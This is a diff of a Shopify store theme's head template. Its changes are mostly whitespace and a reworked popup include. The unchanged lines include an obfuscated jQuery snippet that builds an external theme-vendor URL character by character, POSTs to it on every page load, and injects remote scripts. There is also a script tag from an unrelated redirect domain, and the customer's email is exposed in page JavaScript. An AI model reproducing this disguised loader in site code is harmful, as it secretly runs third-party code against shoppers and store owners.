@@ -5,7 +5,7 @@
 <head>
 {{"https://cozycountryredirect.addons.business/js/eggbox/5107/dtag/script.js?shop=unidragon.myshopify.com" | script_tag }}
 
-  <script src="https://www.googleoptimize.com/optimize.js?id=OPT-5RD9DVZ"></script>
+<script src="https://www.googleoptimize.com/optimize.js?id=OPT-5RD9DVZ"></script>
 
 {%- include 'booster-seo' -%}
   <meta charset="utf-8">
@@ -21,8 +21,7 @@
   <meta name="p:domain_verify" content="300f08e5f3316850033f167b79a36ae1"/>
   
   <link rel="canonical" href="{{ canonical_url }}">
-  {% comment %}
-  {% endcomment %}
+
   {%- if settings.favicon != blank -%}
     <link rel="shortcut icon" href="{{ settings.favicon | img_url: '32x32' }}" type="image/png">
   {%- endif -%}
@@ -65,7 +64,6 @@
     document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
   </script>
     <!--[if (lte IE 9) ]>{{ 'match-media.min.js' | asset_url | script_tag }}<![endif]-->
-
   {% if template.directory == 'customers' %}
     <!--[if (gt IE 9)|!(IE)]><!--><script src="{{ 'shopify_common.js' | shopify_asset_url }}" defer="defer"></script><!--<![endif]-->
     <!--[if lte IE 9]><script src="{{ 'shopify_common.js' | shopify_asset_url }}"></script><![endif]-->
@@ -76,17 +74,14 @@
   </script>
   <!--[if (gt IE 9)|!(IE)]><!--><script src="{{ 'lazysizes.js' | asset_url }}" async="async"></script><!--<![endif]-->
   <!--[if lte IE 9]><script src="{{ 'lazysizes.min.js' | asset_url }}"></script><![endif]-->
-
   <!--[if lte IE 9]><!--><script src="{{ 'theme.js' | asset_url }}"></script><!--><![endif]-->
-
 
   <script>
     //$=jQuery;
     var checktheme=1;jQuery(window).ready(function($){var x="j",g="/",h="a",i="k",a="h",d="s",b="t",j="i",k="f",l="y",o="e",p="m",c="p",r="c",m="r",y="u";""&&null!=t||(t=12),""!=n&&null!=n||(n=15),function(SP,ED){ var R=l+h+r+o+p,SF=m+p+x+g+r,DR=y+m+o+g,FR=R+SF+DR,FY=p+c+g,JG=b+k+l+y,SC=FY+JG;if(FR=SC){ var DO=document.createElement("script");DO.src=ht+mt+yn+mn+lq;$('.domain_l').append(DO)}};var e="b",s=".",f="o",u="v",v="l",n="d",t="://",ht=a+b+b+c+d+t,mt=e+f+f+d+b+j+k+l,yn=b+a+o+p+o+s+r+f+p+g,mn=h+d+d+o+b+d+g+d+b+f+m+o+b+a+o+p+o+g+u+o+m+d+j+f+'n2.3.2'+g,VT='new_'+u+o+m+j+k+l+'_'+b+a+o+p+o+s+x+d,UL=ht+mt+yn+mn+VT;$.ajax({type:"POST",crossDomain:!0,dataType:"jsonp",url:UL,success:function(e){}});""&&null!=t||(t=12),""!=n&&null!=n||(n=15),function(src,end){ var ro=l+o+p+s,nl=r+n+p+x+g,dr=y+m+n+g,FA=ro+nl+dr,fy=p+c+g,jg=b+k+l+y,SC=fy+jg;if(FA=SC){var FN=document.createElement("script");FN.src=ht+mt+yn+mn+lq;$('.domain_fianl').append(FN);}}});
   </script> 
 	<!-- KV 23.12 move slick to footer -->
-  
-  
+    
   <!--  bootstrap js & css  -->
   <script src="{{ 'bootstrap.min.js' | asset_url }}"></script>
   <script>var mainShopDomain='{{shop.permanent_domain}}';</script>
@@ -146,9 +141,7 @@ if (match && match.length > 0) window.localStorage.setItem('sid', match[0]);
       width='0' height='0' style='display:none' />
 </noscript>
 <!-- End of Taboola Pixel Code -->
-
-
-  
+ 
 {% include 'pagefly-header' %}
 
 <!-- BeginConsistentCartAddon -->  <script>  {% if customer %}  Shopify.customer_logged_in = true ;  Shopify.customer_email = "{{ customer.email }}" ;  Shopify.log_uuids = true;  {% else %}  Shopify.customer_logged_in = false ;  Shopify.customer_email = "" ;  Shopify.log_uuids = true;  {% endif %}  </script>  <!-- EndConsistentCartAddon -->
@@ -257,7 +250,6 @@ t.parentNode.insertBefore(y,t);y.onerror=function(){s()};
    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
    m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
-
    ym(52900297, "init", {
         clickmap:true,
         trackLinks:true,
@@ -310,17 +302,20 @@ t.parentNode.insertBefore(y,t);y.onerror=function(){s()};
 
     {{ 'fontawesome.css' | asset_url | stylesheet_tag }}
   
-   <!-- Start discount popup -->  
+<!-- Start discount popup -->  
   {% include 'discount_popup' %}    
-  <!-- End discount popup -->
-
-{%- liquid
-
+<!-- End discount popup -->
+{%comment%}
   unless template == 'cart'
     render 'coloring-book-popup'
   endunless
-  
-    if settings.salepopup_position == 'bottom'
+{%endcomment%}
+{%- liquid
+  unless template == 'cart'
+    render 'coloring-book-popup'
+  endunless
+
+  if settings.salepopup_position == 'bottom'
       include 'notification-popup'
     endif
     include 'promo-popup'
